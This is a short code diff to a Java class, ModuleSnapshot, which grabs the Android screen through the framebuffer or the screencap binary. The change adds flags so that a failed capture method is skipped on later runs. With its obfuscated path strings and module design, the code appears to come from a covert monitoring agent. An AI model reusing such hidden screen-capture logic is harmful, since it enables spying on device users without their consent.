@@ -69,6 +69,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private int type;
 	private int quality;
 	Semaphore working = new Semaphore(1, true);
+	
+	private boolean frameBuffer = true;
+	private boolean screenCap = true;
 
 	/*
 	 * (non-Javadoc)
@@ -135,7 +138,10 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 		try {
 			if(!frameBufferMethod()){
-				screencapMethod();
+				frameBuffer = false;
+				if(!screencapMethod()){
+					screenCap  = false;
+				}
 			}
 
 		} catch (final Exception ex) {
@@ -157,6 +163,11 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (screencapMethod) ");
 		}
+		
+		if(!screenCap){
+			return false;
+		}
+		
 		String sc = M.e("/system/bin/screencap");
 		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName()+ M.e("/files/frame.png");
 		
@@ -212,9 +223,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (frameBufferMethod) ");
 		}
+		
+		if(!frameBuffer ){
+			return false;
+		}
+		
 		final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
 				.getDefaultDisplay();
-
+		
 		int width, height, w, h;
 		final int orientation = display.getOrientation();
 
